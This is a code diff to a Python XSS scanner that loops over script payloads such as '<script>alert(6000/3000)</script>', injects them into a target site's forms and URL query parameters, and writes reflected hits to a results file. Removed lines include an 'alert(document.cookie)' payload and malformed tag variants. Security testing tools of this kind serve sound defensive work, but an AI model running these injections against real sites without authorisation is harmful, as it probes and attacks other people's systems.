@@ -9,29 +9,11 @@ class core:
 	@classmethod
 	def generate(self,eff):		
 		FUNCTION=[
-			"prompt(5000/200)",
-			"alert(6000/3000)",
-			"alert(document.cookie)",
-			"prompt(document.cookie)",
-			"console.log(5000/3000)"
+			"<script>prompt(5000/200)</script>",
+			"<script>alert(6000/3000)</script>",
 		]
-		if eff == 1:
-			return "<script/>"+FUNCTION[randint(0,4)]+"<\script\>"
-		
-		elif eff == 2:
-			return "<\script/>"+FUNCTION[randint(0,4)]+"<\\script>"	
-			
-		elif eff == 3:
-			return "<\script\> "+FUNCTION[randint(0,4)]+"<//script>"
-			
-		elif eff == 4:
-			return "<script>"+FUNCTION[randint(0,4)]+"<\script/>"
-			
-		elif eff == 5:
-			return "<script>"+FUNCTION[randint(0,4)]+"<//script>"
-			
-		elif eff == 6:
-			return "<script>"+FUNCTION[randint(0,4)]+"</script>"
+		for payload in FUNCTION:
+			yield payload
 			
 	@classmethod
 	def post_method(self):
@@ -45,30 +27,34 @@ class core:
 				action=self.url
 				
 			if form["method"].lower().strip() == "post":
-				Log.warning("Target have form with POST method: "+C+urljoin(self.url,action))
-				Log.info("Collecting form input key.....")
-				
-				keys={}
-				for key in form.find_all(["input","textarea"]):
-					try:
-						if key["type"] == "submit":
-							Log.info("Form key name: "+G+key["name"]+N+" value: "+G+"<Submit Confirm>")
-							keys.update({key["name"]:key["name"]})
-				
-						else:
-							Log.info("Form key name: "+G+key["name"]+N+" value: "+G+self.payload)
-							keys.update({key["name"]:self.payload})
-							
-					except Exception as e:
-						Log.info("Internal error: "+str(e))
-				
-				Log.info("Sending payload (POST) method...")
-				req=self.session.post(urljoin(self.url,action),data=keys)
-				if self.payload in req.text:
-					Log.high("Detected XSS (POST) at "+urljoin(self.url,req.url))
-					Log.high("Post data: "+str(keys))
-				else:
-					Log.info("This page is safe from XSS (POST) attack but not 100% yet...")
+				for i in range(len(self.payload)):
+					Log.warning("Target have form with POST method: "+C+urljoin(self.url,action))
+					Log.info("Collecting form input key.....")
+					
+					keys={}
+					for key in form.find_all(["input","textarea"]):
+						try:
+							if key["type"] == "submit":
+								Log.info("Form key name: "+G+key["name"]+N+" value: "+G+"<Submit Confirm>")
+								keys.update({key["name"]:key["name"]})
+					
+							else:
+								Log.info("Form key name: "+G+key["name"]+N+" value: "+G+self.payload[i])
+								keys.update({key["name"]:self.payload[i]})
+								
+						except Exception as e:
+							Log.info("Internal error: "+str(e))
+					
+					Log.info("Sending payload (POST) method...")
+					req=self.session.post(urljoin(self.url,action),data=keys)
+					if self.payload[i] in req.text:
+						Log.high("Detected XSS (POST) at "+urljoin(self.url,req.url))
+						Log.high("Post data: "+str(keys))
+						with open('xsscon_results.txt','a') as f:
+							output = f"[XSS Found] {self.url} - Payload: {self.payload[i]}"
+							f.write(output + "\n")
+					else:
+						Log.info("This page is safe from XSS (POST) attack but not 100% yet...")
 	
 	@classmethod
 	def get_method_form(self):
@@ -86,31 +72,32 @@ class core:
 				Log.info("Collecting form input key.....")
 				
 				keys={}
-				for key in form.find_all(["input","textarea"]):
-					try:
-						if key["type"] == "submit":
-							Log.info("Form key name: "+G+key["name"]+N+" value: "+G+"<Submit Confirm>")
-							keys.update({key["name"]:key["name"]})
-				
-						else:
-							Log.info("Form key name: "+G+key["name"]+N+" value: "+G+self.payload)
-							keys.update({key["name"]:self.payload})
-							
-					except Exception as e:
-						Log.info("Internal error: "+str(e))
+				for i in range(len(self.payload)):
+					for key in form.find_all(["input","textarea"]):
 						try:
-							Log.info("Form key name: "+G+key["name"]+N+" value: "+G+self.payload)
-							keys.update({key["name"]:self.payload})
-						except KeyError as e:
+							if key["type"] == "submit":
+								Log.info("Form key name: "+G+key["name"]+N+" value: "+G+"<Submit Confirm>")
+								keys.update({key["name"]:key["name"]})
+					
+							else:
+								Log.info("Form key name: "+G+key["name"]+N+" value: "+G+self.payload[i])
+								keys.update({key["name"]:self.payload[i]})
+								
+						except Exception as e:
 							Log.info("Internal error: "+str(e))
-						
-				Log.info("Sending payload (GET) method...")
-				req=self.session.get(urljoin(self.url,action),params=keys)
-				if self.payload in req.text:
-					Log.high("Detected XSS (GET) at "+urljoin(self.url,req.url))
-					Log.high("GET data: "+str(keys))
-				else:
-					Log.info("This page is safe from XSS (GET) attack but not 100% yet...")
+							try:
+								Log.info("Form key name: "+G+key["name"]+N+" value: "+G+self.payload[i])
+								keys.update({key["name"]:self.payload[i]})
+							except KeyError as e:
+								Log.info("Internal error: "+str(e))
+							
+					Log.info("Sending payload (GET) method...")
+					req=self.session.get(urljoin(self.url,action),params=keys)
+					if self.payload[i] in req.text:
+						Log.high("Detected XSS (GET) at "+urljoin(self.url,req.url))
+						Log.high("GET data: "+str(keys))
+					else:
+						Log.info("This page is safe from XSS (GET) attack but not 100% yet...")
 		
 	@classmethod
 	def get_method(self):
@@ -121,23 +108,27 @@ class core:
 			if url.startswith("http://") is False or url.startswith("https://") is False or url.startswith("mailto:") is False:
 				base=urljoin(self.url,a["href"])
 				query=urlparse(base).query
-				if query != "":
-					Log.warning("Found link with query: "+G+query+N+" Maybe a vuln XSS point")
-					
-					query_payload=query.replace(query[query.find("=")+1:len(query)],self.payload,1)
-					test=base.replace(query,query_payload,1)
-					
-					query_all=base.replace(query,urlencode({x: self.payload for x in parse_qs(query)}))
-					
-					Log.info("Query (GET) : "+test)
-					Log.info("Query (GET) : "+query_all)
-					
-					_respon=self.session.get(test)
-					if self.payload in _respon.text or self.payload in self.session.get(query_all).text:
-						Log.high("Detected XSS (GET) at "+_respon.url)
-					else:
-						Log.info("This page is safe from XSS (GET) attack but not 100% yet...")
-	
+				for i in range(len(self.payload)):
+					if query != "":
+						Log.warning("Found link with query: "+G+query+N+" Maybe a vuln XSS point")
+						
+						query_payload=query.replace(query[query.find("=")+1:len(query)],self.payload[i],1)
+						test=base.replace(query,query_payload,1)
+						
+						query_all=base.replace(query,urlencode({x: self.payload[i] for x in parse_qs(query)}))
+						
+						Log.info("Query (GET) : "+test)
+						Log.info("Query (GET) : "+query_all)
+						
+						_respon=self.session.get(test)
+						if self.payload[i] in _respon.text or self.payload[i] in self.session.get(query_all).text:
+							Log.high("Detected XSS (GET) at "+_respon.url)
+							with open('xsscon_results.txt','a') as f:
+								output = f"[XSS Found] {self.url} - Payload: {self.payload[i]}"
+								f.write(output + "\n")
+						else:
+							Log.info("This page is safe from XSS (GET) attack but not 100% yet...")
+		
 	@classmethod
 	def main(self,url,proxy,headers,payload,cookie,method=2):
 	
@@ -171,3 +162,10 @@ class core:
 		elif method == 0:
 			self.get_method()
 			self.get_method_form()
+		with open("xsscon_results.txt", "r") as f:
+			lines = f.readlines()
+		
+		lines = list(set(lines))
+		with open("xsscon_results.txt", "w") as f:
+			f.writelines(lines)
+		
